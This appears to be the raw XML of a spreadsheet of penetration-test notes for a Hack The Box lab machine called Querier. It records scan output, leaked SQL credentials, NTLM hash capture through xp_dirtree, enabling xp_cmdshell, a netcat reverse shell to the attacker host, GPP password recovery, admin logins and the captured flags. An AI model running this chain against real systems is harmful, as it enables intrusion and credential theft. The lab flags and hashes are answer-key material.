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187F5EBE-2767-47A3-B4E7-D7FED59A8605}" xr6:coauthVersionLast="47" xr6:coauthVersionMax="47" xr10:uidLastSave="{00000000-0000-0000-0000-000000000000}"/>
  <bookViews>
    <workbookView xWindow="-120" yWindow="-16320" windowWidth="29040" windowHeight="15720" xr2:uid="{9AA4AFCA-69F3-4FD9-877C-89FBB0C8B483}"/>
  </bookViews>
  <sheets>
    <sheet name="Network" sheetId="1" r:id="rId1"/>
    <sheet name="Web App" sheetId="3" r:id="rId2"/>
    <sheet name="On host" sheetId="4" r:id="rId3"/>
    <sheet name="Commands" sheetId="2" r:id="rId4"/>
    <sheet name="Misc" sheetId="5" r:id="rId5"/>
    <sheet name="Reverse Engineering" sheetId="6" r:id="rId6"/>
  </sheets>
  <definedNames>
    <definedName name="_xlnm._FilterDatabase" localSheetId="0" hidden="1">Network!$A$1:$K$1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15" i="1" l="1"/>
  <c r="F7" i="1"/>
  <c r="F3" i="1"/>
  <c r="F11" i="1"/>
  <c r="F12" i="1"/>
  <c r="F9" i="1"/>
  <c r="F2" i="1"/>
  <c r="F6" i="1"/>
  <c r="F13" i="1"/>
  <c r="F14" i="1"/>
  <c r="F5" i="1"/>
  <c r="F10" i="1"/>
  <c r="E15" i="1"/>
  <c r="E7" i="1"/>
  <c r="E3" i="1"/>
  <c r="E11" i="1"/>
  <c r="E12" i="1"/>
  <c r="E9" i="1"/>
  <c r="E2" i="1"/>
  <c r="E6" i="1"/>
  <c r="E13" i="1"/>
  <c r="E14" i="1"/>
  <c r="E5" i="1"/>
  <c r="E10" i="1"/>
  <c r="F8" i="1"/>
  <c r="E8" i="1"/>
  <c r="E4" i="1"/>
  <c r="F4" i="1"/>
</calcChain>
</file>

<file path=xl/sharedStrings.xml><?xml version="1.0" encoding="utf-8"?>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="147" uniqueCount="93">
  <si>
    <t>IP</t>
  </si>
  <si>
    <t>Hostname</t>
  </si>
  <si>
    <t>Port</t>
  </si>
  <si>
    <t>Protocol</t>
  </si>
  <si>
    <t>Service</t>
  </si>
  <si>
    <t>Notes</t>
  </si>
  <si>
    <t>Commands used</t>
  </si>
  <si>
    <t>Base URL</t>
  </si>
  <si>
    <t>Path</t>
  </si>
  <si>
    <t>Evidence</t>
  </si>
  <si>
    <t>Resources</t>
  </si>
  <si>
    <t>Host</t>
  </si>
  <si>
    <t>User</t>
  </si>
  <si>
    <t>Privileges</t>
  </si>
  <si>
    <t>Groups</t>
  </si>
  <si>
    <t>OS info</t>
  </si>
  <si>
    <t>Status</t>
  </si>
  <si>
    <t>Status + Path (from Kali)</t>
  </si>
  <si>
    <t>Port + Protocol</t>
  </si>
  <si>
    <t>#=LEFT($D2,FIND("/",$D2)-1)</t>
  </si>
  <si>
    <t>#=MID($D2,FIND("/",$D2)+1,LEN($D2))</t>
  </si>
  <si>
    <t>Files/Artifacts</t>
  </si>
  <si>
    <t>Misc</t>
  </si>
  <si>
    <t>cat hosts /etc/hosts | sudo tee /etc/hosts | head -1</t>
  </si>
  <si>
    <t>Task</t>
  </si>
  <si>
    <t>App</t>
  </si>
  <si>
    <t>Sub task</t>
  </si>
  <si>
    <t>impacket-smbserver share ./ -smb2support</t>
  </si>
  <si>
    <t>john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</t>
  </si>
  <si>
    <t>Resource</t>
  </si>
  <si>
    <t>445/tcp</t>
  </si>
  <si>
    <t>49664/tcp</t>
  </si>
  <si>
    <t>49671/tcp</t>
  </si>
  <si>
    <t>47001/tcp</t>
  </si>
  <si>
    <t>139/tcp</t>
  </si>
  <si>
    <t>49667/tcp</t>
  </si>
  <si>
    <t>49668/tcp</t>
  </si>
  <si>
    <t>49665/tcp</t>
  </si>
  <si>
    <t>135/tcp</t>
  </si>
  <si>
    <t>5985/tcp</t>
  </si>
  <si>
    <t>49669/tcp</t>
  </si>
  <si>
    <t>49670/tcp</t>
  </si>
  <si>
    <t>1433/tcp</t>
  </si>
  <si>
    <t>49666/tcp</t>
  </si>
  <si>
    <t>Windows</t>
  </si>
  <si>
    <t>QUERIER.HTB.LOCAL</t>
  </si>
  <si>
    <t>135/tcp   open  msrpc         Microsoft Windows RPC</t>
  </si>
  <si>
    <t>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</t>
  </si>
  <si>
    <t>445/tcp   open  microsoft-ds?</t>
  </si>
  <si>
    <t>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0</t>
  </si>
  <si>
    <t>47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0</t>
  </si>
  <si>
    <t>49664/tcp open  msrpc         Microsoft Windows RPC</t>
  </si>
  <si>
    <t>49671/tcp open  msrpc         Microsoft Windows RPC</t>
  </si>
  <si>
    <t>49667/tcp open  msrpc         Microsoft Windows RPC</t>
  </si>
  <si>
    <t>49668/tcp open  msrpc         Microsoft Windows RPC</t>
  </si>
  <si>
    <t>49665/tcp open  msrpc         Microsoft Windows RPC</t>
  </si>
  <si>
    <t>49669/tcp open  msrpc         Microsoft Windows RPC</t>
  </si>
  <si>
    <t>49670/tcp open  msrpc         Microsoft Windows RPC</t>
  </si>
  <si>
    <t>49666/tcp open  msrpc         Microsoft Windows RPC</t>
  </si>
  <si>
    <t>There is an Excel report in the Reports SMB share. Password in the VBA script.</t>
  </si>
  <si>
    <t>Diver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6</t>
  </si>
  <si>
    <t>SELECT name FROM master.sys.all_objects WHERE name = 'xp_dirtree';</t>
  </si>
  <si>
    <t>SELECT SYSTEM_USER;</t>
  </si>
  <si>
    <t xml:space="preserve">SELECT IS_SRVROLEMEMBER('sysadmin'); </t>
  </si>
  <si>
    <t>sudo responder -I tun0</t>
  </si>
  <si>
    <t xml:space="preserve">EXEC sp_configure 'show advanced options', 1; 
RECONFIGURE; 
EXEC sp_configure 'xp_cmdshell', 1;  
RECONFIGURE;  </t>
  </si>
  <si>
    <t>rlwrap nc -lnvp 443</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>user.txt: be23776a72e6bb1f0c6ab9686c09d6ea
corporate568     (mssql-svc)</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">
mssql-svc::QUERIER:90b3341c0f27dcc0:F310B27D78B4D9BB625D5D5DB158918D:010100000000000000489E306829DD01EBBC0073E1F541BF00000000020008004B0043003400350001001E00570049004E002D0052005200440049004A0038005000340049004A00450004003400570049004E002D0052005200440049004A0038005000340049004A0045002E004B004300340035002E004C004F00430041004C00030014004B004300340035002E004C004F00430041004C00050014004B004300340035002E004C004F00430041004C000700080000489E306829DD0106000400020000000800300030000000000000000000000000300000DEACD076B22EE3DBBC0A217D0BB5471AC683408F1EF526F9B52EDBC56C9B65020A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310035002E00320034003500000000000000000000000000  </t>
    </r>
  </si>
  <si>
    <t>Connected to database. Took a while because I got the wrong syntax.
"xp_dirtree does exactly what the name says: given a path, it walks the directory tree and lists subdirectories (that's the recursion depth argument)."
I'm also a server admin as mssql-svc.
So you had to configure xp_cmdshell. Then download nc via smb and execute it.</t>
  </si>
  <si>
    <t>querier\mssql-svc</t>
  </si>
  <si>
    <t xml:space="preserve">PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
ERROR: Unable to get user claims information.
</t>
  </si>
  <si>
    <t xml:space="preserve">GROUP INFORMATION
-----------------
Group Name                           Type             SID                                                             Attributes                                        
==================================== ================ =============================================================== ==================================================
Everyone                             Well-known group S-1-1-0                                                         Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545                                                    Mandatory group, Enabled by default, Enabled group
BUILTIN\Performance Monitor Users    Alias            S-1-5-32-558                                                    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6                                                         Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1                                                         Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11                                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15                                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account           Well-known group S-1-5-113                                                       Mandatory group, Enabled by default, Enabled group
NT SERVICE\MSSQLSERVER               Well-known group S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003 Enabled by default, Enabled group, Group owner    
LOCAL                                Well-known group S-1-2-0                                                         Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10                                                     Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288              </t>
  </si>
  <si>
    <t>. .\PowerUp.ps1</t>
  </si>
  <si>
    <t>UserNames : {Administrator}
Passwords : {MyUnclesAreMarioAndLuigi!!1!}</t>
  </si>
  <si>
    <t>Ran PowerUp. Found creds in GPP file.
Just log in with the admin password.</t>
  </si>
  <si>
    <t>querier\administrator</t>
  </si>
  <si>
    <t>root.txt: 135c7f655b6b3ca1667fd84dbcd7f9f4</t>
  </si>
  <si>
    <t>[victim IP]</t>
  </si>
  <si>
    <t>1433/tcp  open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   [victim IP]:1433: 
|     Target_Name: HTB
|     NetBIOS_Domain_Name: HTB
|     NetBIOS_Computer_Name: QUERIER
|     DNS_Domain_Name: HTB.LOCAL
|     DNS_Computer_Name: QUERIER.HTB.LOCAL
|     DNS_Tree_Name: HTB.LOCAL
|_    Product_Version: 10.0.17763
|_ssl-date: 2026-08-11T11:38:32+00:00; +1s from scanner time.
| ms-sql-info: 
|   [victim IP]:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-08-11T11:28:23
| Not valid after:  2056-08-11T11:28:23
| MD5:   da3a:4603:83ba:6777:c55a:ec23:03d3:ba18
|_SHA-1: 655d:abd0:200d:d26f:ab26:d1bf:9966:339c:c122:d1ba</t>
  </si>
  <si>
    <t>sudo masscan -pT:1-65535,U:1-65535 --rate=1000 -e tun0 [victim IP] &gt; raw_ports.txt</t>
  </si>
  <si>
    <t>sudo nmap -p$(cat raw_ports.txt | cut -d ' ' -f 4 | cut -d '/' -f 1 | sort -un | tr '\n' ',' | sed 's/,$//') -sS -sV --version-all -sC -O -T3 -v [victim IP]</t>
  </si>
  <si>
    <t>netexec smb [victim IP] --generate-hosts-file hosts</t>
  </si>
  <si>
    <t>netexec smb [victim IP]  -u '' -p '' --shares</t>
  </si>
  <si>
    <t>netexec smb [victim IP] -u 'null' -p '' --shares</t>
  </si>
  <si>
    <t>evil-winrm -i [victim IP] -u mssql-svc -p 'corporate568'</t>
  </si>
  <si>
    <t>smbclient -L //[victim IP] -N</t>
  </si>
  <si>
    <t>smbclient //[victim IP]/Reports -N -c 'recurse ON; prompt OFF; mget *'</t>
  </si>
  <si>
    <t>impacket-mssqlclient reporting:'PcwTWTHRwryjc$c6'@[victim IP] -windows-auth</t>
  </si>
  <si>
    <t>impacket-mssqlclient mssql-svc:'corporate568'@[victim IP] -windows-auth</t>
  </si>
  <si>
    <t>wmiexec.py 'administrator:MyUnclesAreMarioAndLuigi!!1!@[victim IP]'</t>
  </si>
  <si>
    <t>EXEC master.sys.xp_dirtree '\\[attack IP]\n0ll', 1, 1;</t>
  </si>
  <si>
    <t>xp_cmdshell \\[attack IP]\share\nc64.exe -e cmd.exe [attack IP] 443</t>
  </si>
  <si>
    <t>xcopy \\[attack IP]\share\PowerUp.ps1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</si>
</sst>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2"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C755-4FE5-4C70-ABDC-86E8ABD7F626}">
  <dimension ref="A1:K30"/>
  <sheetViews>
    <sheetView tabSelected="1" zoomScale="75" zoomScaleNormal="75" workbookViewId="0">
      <pane ySplit="1" topLeftCell="A2" activePane="bottomLeft" state="frozen"/>
      <selection activeCell="E1" sqref="E1"/>
      <selection pane="bottomLeft" activeCell="D25" sqref="D25"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultColWidth="15.77734375" defaultRowHeight="15" customHeight="1"/>
  <cols>
    <col min="1" max="1" width="18.6640625" style="2" customWidth="1"/>
    <col min="2" max="2" width="15.77734375" style="2"/>
    <col min="3" max="3" width="23" style="2" customWidth="1"/>
    <col min="4" max="4" width="19.6640625" style="2" customWidth="1"/>
    <col min="5" max="5" width="17.6640625" style="2" customWidth="1"/>
    <col min="6" max="6" width="17.109375" style="2" customWidth="1"/>
    <col min="7" max="7" width="23.5546875" style="2" customWidth="1"/>
    <col min="8" max="8" width="35.44140625" style="2" customWidth="1"/>
    <col min="9" max="9" width="45.109375" style="2" customWidth="1"/>
    <col min="10" max="10" width="36.6640625" style="2" customWidth="1"/>
    <col min="11" max="11" width="36.88671875" style="2" customWidth="1"/>
    <col min="12" max="16384" width="15.77734375" style="2"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:11" s="4" customFormat="1" ht="15" customHeight="1">
      <c r="A1" s="4" t="s">
        <v>0</v>
      </c>
      <c r="B1" s="4" t="s">
        <v>15</v>
      </c>
      <c r="C1" s="4" t="s">
        <v>1</v>
      </c>
      <c r="D1" s="4" t="s">
        <v>18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21</v>
      </c>
      <c r="J1" s="4" t="s">
        <v>10</v>
      </c>
      <c r="K1" s="4" t="s">
        <v>9</v>
      </c>
    </row>
    <row r="2" spans="1:11" ht="15" customHeight="1">
      <c r="A2" s="2" t="s">
        <v>77</v>
      </c>
      <c r="B2" s="2" t="s">
        <v>44</v>
      </c>
      <c r="C2" s="2" t="s">
        <v>45</v>
      </c>
      <c r="D2" s="2" t="s">
        <v>38</v>
      </c>
      <c r="E2" s="7" t="str">
        <f t="shared" ref="E2:E15" si="0">LEFT($D2,FIND("/",$D2)-1)</f>
        <v>135</v>
      </c>
      <c r="F2" s="6" t="str">
        <f t="shared" ref="F2:F15" si="1">MID($D2,FIND("/",$D2)+1,LEN($D2))</f>
        <v>tcp</v>
      </c>
      <c r="G2" s="2" t="s">
        <v>46</v>
      </c>
    </row>
    <row r="3" spans="1:11" ht="15" customHeight="1">
      <c r="A3" s="2" t="s">
        <v>77</v>
      </c>
      <c r="B3" s="2" t="s">
        <v>44</v>
      </c>
      <c r="C3" s="2" t="s">
        <v>45</v>
      </c>
      <c r="D3" s="2" t="s">
        <v>34</v>
      </c>
      <c r="E3" s="7" t="str">
        <f t="shared" si="0"/>
        <v>139</v>
      </c>
      <c r="F3" s="6" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G3" s="2" t="s">
        <v>47</v>
      </c>
      <c r="J3" s="5"/>
    </row>
    <row r="4" spans="1:11" ht="15" customHeight="1">
      <c r="A4" s="2" t="s">
        <v>77</v>
      </c>
      <c r="B4" s="2" t="s">
        <v>44</v>
      </c>
      <c r="C4" s="2" t="s">
        <v>45</v>
      </c>
      <c r="D4" s="2" t="s">
        <v>30</v>
      </c>
      <c r="E4" s="7" t="str">
        <f t="shared" si="0"/>
        <v>445</v>
      </c>
      <c r="F4" s="6" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G4" s="2" t="s">
        <v>48</v>
      </c>
      <c r="H4" s="2" t="s">
        <v>59</v>
      </c>
      <c r="I4" s="2" t="s">
        <v>60</v>
      </c>
    </row>
    <row r="5" spans="1:11" ht="15" customHeight="1">
      <c r="A5" s="2" t="s">
        <v>77</v>
      </c>
      <c r="B5" s="2" t="s">
        <v>44</v>
      </c>
      <c r="C5" s="2" t="s">
        <v>45</v>
      </c>
      <c r="D5" s="2" t="s">
        <v>42</v>
      </c>
      <c r="E5" s="7" t="str">
        <f t="shared" si="0"/>
        <v>1433</v>
      </c>
      <c r="F5" s="6" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G5" s="2" t="s">
        <v>78</v>
      </c>
      <c r="H5" s="2" t="s">
        <v>68</v>
      </c>
      <c r="J5" s="2" t="s">
        <v>67</v>
      </c>
    </row>
    <row r="6" spans="1:11" ht="15" customHeight="1">
      <c r="A6" s="1" t="s">
        <v>77</v>
      </c>
      <c r="B6" s="2" t="s">
        <v>44</v>
      </c>
      <c r="C6" s="2" t="s">
        <v>45</v>
      </c>
      <c r="D6" s="2" t="s">
        <v>39</v>
      </c>
      <c r="E6" s="7" t="str">
        <f t="shared" si="0"/>
        <v>5985</v>
      </c>
      <c r="F6" s="6" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G6" s="2" t="s">
        <v>49</v>
      </c>
    </row>
    <row r="7" spans="1:11" ht="15" customHeight="1">
      <c r="A7" s="1" t="s">
        <v>77</v>
      </c>
      <c r="B7" s="2" t="s">
        <v>44</v>
      </c>
      <c r="C7" s="2" t="s">
        <v>45</v>
      </c>
      <c r="D7" s="2" t="s">
        <v>33</v>
      </c>
      <c r="E7" s="7" t="str">
        <f t="shared" si="0"/>
        <v>47001</v>
      </c>
      <c r="F7" s="6" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G7" s="2" t="s">
        <v>50</v>
      </c>
      <c r="I7" s="4"/>
      <c r="J7" s="5"/>
    </row>
    <row r="8" spans="1:11" ht="15" customHeight="1">
      <c r="A8" s="1" t="s">
        <v>77</v>
      </c>
      <c r="B8" s="2" t="s">
        <v>44</v>
      </c>
      <c r="C8" s="2" t="s">
        <v>45</v>
      </c>
      <c r="D8" s="2" t="s">
        <v>31</v>
      </c>
      <c r="E8" s="7" t="str">
        <f t="shared" si="0"/>
        <v>49664</v>
      </c>
      <c r="F8" s="6" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G8" s="2" t="s">
        <v>51</v>
      </c>
      <c r="J8" s="5"/>
    </row>
    <row r="9" spans="1:11" ht="15" customHeight="1">
      <c r="A9" s="1" t="s">
        <v>77</v>
      </c>
      <c r="B9" s="2" t="s">
        <v>44</v>
      </c>
      <c r="C9" s="2" t="s">
        <v>45</v>
      </c>
      <c r="D9" s="2" t="s">
        <v>37</v>
      </c>
      <c r="E9" s="7" t="str">
        <f t="shared" si="0"/>
        <v>49665</v>
      </c>
      <c r="F9" s="6" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G9" s="2" t="s">
        <v>55</v>
      </c>
      <c r="I9" s="4"/>
      <c r="J9" s="5"/>
    </row>
    <row r="10" spans="1:11" ht="15" customHeight="1">
      <c r="A10" s="1" t="s">
        <v>77</v>
      </c>
      <c r="B10" s="2" t="s">
        <v>44</v>
      </c>
      <c r="C10" s="2" t="s">
        <v>45</v>
      </c>
      <c r="D10" s="2" t="s">
        <v>43</v>
      </c>
      <c r="E10" s="7" t="str">
        <f t="shared" si="0"/>
        <v>49666</v>
      </c>
      <c r="F10" s="6" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G10" s="2" t="s">
        <v>58</v>
      </c>
    </row>
    <row r="11" spans="1:11" ht="15" customHeight="1">
      <c r="A11" s="1" t="s">
        <v>77</v>
      </c>
      <c r="B11" s="2" t="s">
        <v>44</v>
      </c>
      <c r="C11" s="2" t="s">
        <v>45</v>
      </c>
      <c r="D11" s="2" t="s">
        <v>35</v>
      </c>
      <c r="E11" s="7" t="str">
        <f t="shared" si="0"/>
        <v>49667</v>
      </c>
      <c r="F11" s="6" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G11" s="2" t="s">
        <v>53</v>
      </c>
    </row>
    <row r="12" spans="1:11" ht="15" customHeight="1">
      <c r="A12" s="2" t="s">
        <v>77</v>
      </c>
      <c r="B12" s="2" t="s">
        <v>44</v>
      </c>
      <c r="C12" s="2" t="s">
        <v>45</v>
      </c>
      <c r="D12" s="2" t="s">
        <v>36</v>
      </c>
      <c r="E12" s="7" t="str">
        <f t="shared" si="0"/>
        <v>49668</v>
      </c>
      <c r="F12" s="6" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G12" s="2" t="s">
        <v>54</v>
      </c>
    </row>
    <row r="13" spans="1:11" ht="15" customHeight="1">
      <c r="A13" s="2" t="s">
        <v>77</v>
      </c>
      <c r="B13" s="2" t="s">
        <v>44</v>
      </c>
      <c r="C13" s="2" t="s">
        <v>45</v>
      </c>
      <c r="D13" s="2" t="s">
        <v>40</v>
      </c>
      <c r="E13" s="7" t="str">
        <f t="shared" si="0"/>
        <v>49669</v>
      </c>
      <c r="F13" s="6" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G13" s="2" t="s">
        <v>56</v>
      </c>
    </row>
    <row r="14" spans="1:11" ht="15" customHeight="1">
      <c r="A14" s="1" t="s">
        <v>77</v>
      </c>
      <c r="B14" s="2" t="s">
        <v>44</v>
      </c>
      <c r="C14" s="2" t="s">
        <v>45</v>
      </c>
      <c r="D14" s="2" t="s">
        <v>41</v>
      </c>
      <c r="E14" s="7" t="str">
        <f t="shared" si="0"/>
        <v>49670</v>
      </c>
      <c r="F14" s="6" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G14" s="2" t="s">
        <v>57</v>
      </c>
    </row>
    <row r="15" spans="1:11" ht="15" customHeight="1">
      <c r="A15" s="2" t="s">
        <v>77</v>
      </c>
      <c r="B15" s="2" t="s">
        <v>44</v>
      </c>
      <c r="C15" s="2" t="s">
        <v>45</v>
      </c>
      <c r="D15" s="2" t="s">
        <v>32</v>
      </c>
      <c r="E15" s="7" t="str">
        <f t="shared" si="0"/>
        <v>49671</v>
      </c>
      <c r="F15" s="6" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G15" s="2" t="s">
        <v>52</v>
      </c>
      <c r="I15" s="4"/>
      <c r="J15" s="5"/>
    </row>
    <row r="16" spans="1:11" ht="15" customHeight="1">
      <c r="E16" s="7"/>
      <c r="F16" s="6"/>
    </row>
    <row r="17" spans="1:6" ht="15" customHeight="1">
      <c r="A17" s="1"/>
      <c r="E17" s="7"/>
      <c r="F17" s="6"/>
    </row>
    <row r="18" spans="1:6" ht="15" customHeight="1">
      <c r="E18" s="7"/>
      <c r="F18" s="6"/>
    </row>
    <row r="19" spans="1:6" ht="15" customHeight="1">
      <c r="A19" s="1"/>
      <c r="E19" s="7"/>
      <c r="F19" s="6"/>
    </row>
    <row r="20" spans="1:6" ht="15" customHeight="1">
      <c r="E20" s="7"/>
      <c r="F20" s="6"/>
    </row>
    <row r="21" spans="1:6" ht="15" customHeight="1">
      <c r="A21" s="1"/>
      <c r="E21" s="7"/>
      <c r="F21" s="6"/>
    </row>
    <row r="22" spans="1:6" ht="15" customHeight="1">
      <c r="E22" s="7"/>
      <c r="F22" s="6"/>
    </row>
    <row r="23" spans="1:6" ht="15" customHeight="1">
      <c r="A23" s="1"/>
      <c r="E23" s="7"/>
      <c r="F23" s="6"/>
    </row>
    <row r="24" spans="1:6" ht="15" customHeight="1">
      <c r="E24" s="7"/>
      <c r="F24" s="6"/>
    </row>
    <row r="25" spans="1:6" ht="15" customHeight="1">
      <c r="A25" s="1"/>
      <c r="E25" s="7"/>
      <c r="F25" s="6"/>
    </row>
    <row r="26" spans="1:6" ht="15" customHeight="1">
      <c r="E26" s="7"/>
      <c r="F26" s="6"/>
    </row>
    <row r="27" spans="1:6" ht="15" customHeight="1">
      <c r="E27" s="7"/>
      <c r="F27" s="6"/>
    </row>
    <row r="28" spans="1:6" ht="15" customHeight="1">
      <c r="A28" s="1"/>
      <c r="E28" s="7"/>
      <c r="F28" s="6"/>
    </row>
    <row r="29" spans="1:6" ht="15" customHeight="1">
      <c r="E29" s="7"/>
      <c r="F29" s="6"/>
    </row>
    <row r="30" spans="1:6" ht="15" customHeight="1">
      <c r="A30" s="1"/>
      <c r="E30" s="7"/>
      <c r="F30" s="6"/>
    </row>
  </sheetData>
  <autoFilter ref="A1:K1" xr:uid="{6037C755-4FE5-4C70-ABDC-86E8ABD7F626}">
    <sortState xmlns:xlrd2="http://schemas.microsoft.com/office/spreadsheetml/2017/richdata2" ref="A2:K15">
      <sortCondition ref="E1"/>
    </sortState>
  </autoFilter>
  <sortState xmlns:xlrd2="http://schemas.microsoft.com/office/spreadsheetml/2017/richdata2" ref="A2:K30">
    <sortCondition ref="F2:F30"/>
    <sortCondition ref="E2:E30"/>
  </sortState>
  <phoneticPr fontId="3" type="noConversion"/>
  <conditionalFormatting sqref="F2:F30">
    <cfRule type="cellIs" dxfId="1" priority="1" operator="equal">
      <formula>"udp"</formula>
    </cfRule>
    <cfRule type="cellIs" dxfId="0" priority="2" operator="equal">
      <formula>"tcp"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B5CB-E7C9-4655-B0CB-02AE97F3D2B4}">
  <dimension ref="A1:I22"/>
  <sheetViews>
    <sheetView zoomScale="78" zoomScaleNormal="78" workbookViewId="0">
      <pane ySplit="1" topLeftCell="A2" activePane="bottomLeft" state="frozen"/>
      <selection activeCell="C1" sqref="C1"/>
      <selection pane="bottomLeft" sqref="A1:XFD1048576"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultColWidth="31.44140625" defaultRowHeight="15" customHeight="1"/>
  <cols>
    <col min="1" max="16384" width="31.44140625" style="2"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:9" s="4" customFormat="1" ht="15" customHeight="1">
      <c r="A1" s="4" t="s">
        <v>7</v>
      </c>
      <c r="B1" s="4" t="s">
        <v>2</v>
      </c>
      <c r="C1" s="4" t="s">
        <v>17</v>
      </c>
      <c r="D1" s="4" t="s">
        <v>16</v>
      </c>
      <c r="E1" s="4" t="s">
        <v>8</v>
      </c>
      <c r="F1" s="4" t="s">
        <v>5</v>
      </c>
      <c r="G1" s="4" t="s">
        <v>21</v>
      </c>
      <c r="H1" s="4" t="s">
        <v>10</v>
      </c>
      <c r="I1" s="4" t="s">
        <v>9</v>
      </c>
    </row>
    <row r="2" spans="1:9" ht="15" customHeight="1">
      <c r="A2" s="1"/>
      <c r="H2" s="5"/>
    </row>
    <row r="3" spans="1:9" ht="15" customHeight="1">
      <c r="A3" s="1"/>
      <c r="H3" s="5"/>
    </row>
    <row r="4" spans="1:9" ht="15" customHeight="1">
      <c r="H4" s="5"/>
    </row>
    <row r="8" spans="1:9" ht="15" customHeight="1">
      <c r="G8" s="5"/>
    </row>
    <row r="9" spans="1:9" ht="15" customHeight="1">
      <c r="E9" s="4"/>
    </row>
    <row r="10" spans="1:9" ht="15" customHeight="1">
      <c r="E10" s="4"/>
    </row>
    <row r="11" spans="1:9" ht="15" customHeight="1">
      <c r="E11" s="4"/>
    </row>
    <row r="12" spans="1:9" ht="15" customHeight="1">
      <c r="E12" s="4"/>
    </row>
    <row r="13" spans="1:9" ht="15" customHeight="1">
      <c r="E13" s="4"/>
    </row>
    <row r="22" spans="8:8" ht="15" customHeight="1">
      <c r="H22" s="5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3C73-22A5-4008-8739-F489AE5D585F}">
  <dimension ref="A1:K5"/>
  <sheetViews>
    <sheetView zoomScale="75" zoomScaleNormal="75" workbookViewId="0">
      <pane ySplit="1" topLeftCell="A2" activePane="bottomLeft" state="frozen"/>
      <selection activeCell="B1" sqref="B1"/>
      <selection pane="bottomLeft" activeCell="C14" sqref="C14"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultColWidth="15.77734375" defaultRowHeight="15" customHeight="1"/>
  <cols>
    <col min="1" max="1" width="21.88671875" style="2" customWidth="1"/>
    <col min="2" max="4" width="15.77734375" style="2"/>
    <col min="5" max="5" width="30.109375" style="2" customWidth="1"/>
    <col min="6" max="6" width="19.77734375" style="2" customWidth="1"/>
    <col min="7" max="7" width="18" style="2" customWidth="1"/>
    <col min="8" max="8" width="47.88671875" style="2" customWidth="1"/>
    <col min="9" max="9" width="18.44140625" style="2" customWidth="1"/>
    <col min="10" max="10" width="54.88671875" style="2" customWidth="1"/>
    <col min="11" max="11" width="38.44140625" style="2" customWidth="1"/>
    <col min="12" max="16384" width="15.77734375" style="2"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:11" s="4" customFormat="1" ht="15" customHeight="1">
      <c r="A1" s="4" t="s">
        <v>11</v>
      </c>
      <c r="B1" s="4" t="s">
        <v>4</v>
      </c>
      <c r="C1" s="4" t="s">
        <v>2</v>
      </c>
      <c r="D1" s="4" t="s">
        <v>3</v>
      </c>
      <c r="E1" s="4" t="s">
        <v>12</v>
      </c>
      <c r="F1" s="4" t="s">
